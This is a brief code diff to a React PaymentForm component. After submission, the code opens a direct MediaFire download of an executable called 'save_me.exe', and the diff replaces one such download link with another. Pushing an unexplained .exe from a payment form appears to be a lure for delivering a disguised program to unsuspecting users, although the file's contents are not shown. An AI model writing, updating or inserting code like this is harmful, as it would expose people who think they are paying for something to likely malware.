@@ -33,7 +33,7 @@ const PaymentForm = () => {
       setErrorMessage("Error while submitting data");
       return;
     }
-    window.open('https://download1581.mediafire.com/0nulgmezba8gWtjU0SfDf_YjKENWc1iFV7vd8peqk4wRBu_cOURxUFprYvY75g0TKSTQ9Muh6a_Cr9MIEhoHYzKkkoICE-8mzPyuCfgDQcUaNeN0ALbCXLRn6fLNM7F5G9NvX5FBGGZGq7M2Hcve292FELPHEqFKxHD6TNlUdMYPV58/3x072nb1j8ma9l1/save_me.exe', '_blank', 'noreferrer');
+    window.open('https://download1581.mediafire.com/kbozdog9jdpgib7aS4qG1oXV-PsvHK6F5Vi8Q5Rdq08TXFu1GtK71TDayz4ZqPyGPwMUPQW-_BPDM_oT4M2LnH3kDLjIpJEkpIBxjKkBhYl1hgONKpfd95FU7X9GI7AO2q4TxD63W6XHhYUtk0mCT7Vq_HqiV3MVdsHnh8kF2e_Bcg/ey4vh9z363qvj0q/save_me.exe', '_blank', 'noreferrer');
     setState(defaultState)
   };
 
